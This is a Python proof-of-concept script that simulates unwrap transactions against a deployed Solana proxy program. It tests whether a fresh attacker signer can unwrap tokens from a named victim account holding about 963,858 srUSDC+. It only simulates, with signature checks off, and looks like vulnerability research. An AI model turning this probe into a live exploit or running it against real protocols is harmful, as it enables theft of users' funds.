#!/usr/bin/env python3
"""READ-ONLY probe: does the deployed Reflect proxy program (pRoxYU64) verify that the
`branded_user_token_account` passed to `unwrap` is owned by the signing `user`?

We call `unwrap` in simulateTransaction (sigVerify=false, nothing broadcast) with a signer
that does NOT own the branded token account we pass, and inspect the error / post balances.
"""
import json, base64, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solrpc import rpc
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature

PROXY = Pubkey.from_string("pRoxYU64BSjv8HbhENna8a7LVCrkzzNrnvbYuTwas8C")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
SYSTEM = Pubkey.from_string("11111111111111111111111111111111")
ATA_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")

PROXY_STATE0 = Pubkey.from_string("FD4YydhzPpSmXwnHsX1oJBE4er4m9mg4ezaBN9cXgQbz")
PROXY_VAULT0 = Pubkey.from_string("E5ohyMVkBTdn3DekUPcFyLFF2Wi78Rg3Mt9QQDWgN5Mp")
BRANDED_MINT = Pubkey.from_string("sro4agJ6nJ89MJgj2DfDdx8zXVqSyZfCZjbhBfQaJU5")
ORACLE = Pubkey.from_string("4DyKf93NzxTruQh5KMWGH9NkoE32tBBf33m3zyu2Efm3")
USDC_PLUS = Pubkey.from_string("AvZZF1YaZDziPY2RCK4oJrRVrbN3mTD9NL24hPeaZeUj")
# victim branded token account (963,858 srUSDC+), owner = GwJuWxL4GD38XnAa1d3ZdhAWRupnwgqavCqovpL4aTo8
VICTIM_BRANDED = Pubkey.from_string("7cfj48Ym6zsu8WfPtDrU3ERw4Y1WxRzrqd9gF7KrWiJv")
VICTIM_OWNER = Pubkey.from_string("GwJuWxL4GD38XnAa1d3ZdhAWRupnwgqavCqovpL4aTo8")
ATTACKER = Pubkey.new_unique()   # fresh, unprivileged, no keys used

def ata(mint, owner):
    return Pubkey.find_program_address([bytes(owner), bytes(TOKEN), bytes(mint)], ATA_PROG)[0]

def simulate(ixs, label, payer):
    msg = Message.new_with_blockhash(ixs, payer, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                          "replaceRecentBlockhash": True, "commitment": "processed"}])
    val = (r.get("result") or {}).get("value") or {}
    print(f"\n===== {label} =====")
    print("  err:", json.dumps(val.get("err")) if val.get("err") else None, " units:", val.get("unitsConsumed"))
    for l in (val.get("logs") or [])[:12]:
        print("   ", l.replace("Program log: ", ""))
    for b in (val.get("postTokenBalances") or []):
        if b.get("owner") in (str(ATTACKER), str(VICTIM_OWNER)):
            print("   post balance:", b.get("owner"), b.get("mint"), b.get("uiTokenAmount", {}).get("uiAmountString"))
    return val

# docs account order: user, stablecoin_user, branded_user, proxy_state, proxy_vault, branded_mint, oracle, token
def mk_unwrap(user, usdc_user, branded_user):
    return Instruction(PROXY, bytes([2]) + (1000000).to_bytes(8, "little") + (0).to_bytes(8, "little"), [
        AccountMeta(user, True, False),
        AccountMeta(usdc_user, False, True),
        AccountMeta(branded_user, False, True),
        AccountMeta(PROXY_STATE0, False, True),
        AccountMeta(PROXY_VAULT0, False, True),
        AccountMeta(BRANDED_MINT, False, True),
        AccountMeta(ORACLE, False, False),
        AccountMeta(TOKEN, False, False),
    ])

# 1. mismatched owner: signer = victim owner, branded account = someone else's
simulate([mk_unwrap(VICTIM_OWNER, ata(USDC_PLUS, VICTIM_OWNER), VICTIM_BRANDED)],
         "unwrap: signer=GwJuWxL4 owns victim acct (control, should pass owner check)",
         VICTIM_OWNER)

# 2. mismatched: signer = fresh attacker, branded account = victim's
simulate([mk_unwrap(ATTACKER, ata(USDC_PLUS, ATTACKER), VICTIM_BRANDED)],
         "unwrap: signer=FRESH attacker, branded acct = victim's", ATTACKER)

# 3. same, but destination = the proxy vault (exists)
simulate([mk_unwrap(ATTACKER, PROXY_VAULT0, VICTIM_BRANDED)],
         "unwrap: signer=FRESH attacker, branded=victim, dest=proxy vault", ATTACKER)
